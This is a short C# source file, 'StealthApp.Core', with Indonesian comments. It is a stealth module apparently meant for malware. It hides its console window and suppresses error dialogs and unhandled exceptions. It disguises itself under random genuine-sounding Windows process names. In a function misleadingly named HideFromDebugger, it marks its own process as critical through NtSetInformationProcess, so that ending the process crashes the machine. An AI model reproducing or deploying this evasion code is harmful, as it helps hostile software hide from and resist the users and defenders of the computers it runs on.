using System; using System.Runtime.InteropServices; using System.Diagnostics; using System.IO;
namespace StealthApp.Core { internal static class StealthCore { #region WinAPI Imports [DllImport("kernel32.dll")] static extern bool FreeConsole();
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    static extern uint SetErrorMode(uint uMode);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetInformationProcess(
        IntPtr hProcess,
        int processInformationClass,
        ref int processInformation,
        int processInformationLength);
    #endregion

    public static void Init()
    {
        HideConsole();
        SuppressErrors();
        HideFromDebugger();
        SpoofProcessName();
        SuppressExceptions();
    }

    static void HideConsole()
    {
        FreeConsole();
        IntPtr hwnd = GetConsoleWindow();
        if (hwnd != IntPtr.Zero)
            ShowWindow(hwnd, 0);
    }

    static void SuppressErrors()
    {
        // SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
        SetErrorMode(0x0001 | 0x0002 | 0x8000);
    }

    static void HideFromDebugger()
    {
        // ProcessBreakOnTermination — bikin process keliatan kayak critical system process
        int isCritical = 1;
        NtSetInformationProcess(
            Process.GetCurrentProcess().Handle,
            0x1D, // ProcessBreakOnTermination
            ref isCritical,
            sizeof(int));
    }

    static void SpoofProcessName()
    {
        // Nama yang blend sama Windows process
        string[] legitNames = {
            "Windows Runtime Broker",
            "Microsoft Edge Update",
            "Windows Security Health",
            "Service Host: Local System"
        };
        Console.Title = legitNames[new Random().Next(legitNames.Length)];
    }

    static void SuppressExceptions()
    {
        AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
        System.Threading.Tasks.TaskScheduler
            .UnobservedTaskException += (s, e) => e.SetObserved();
    }
}
}
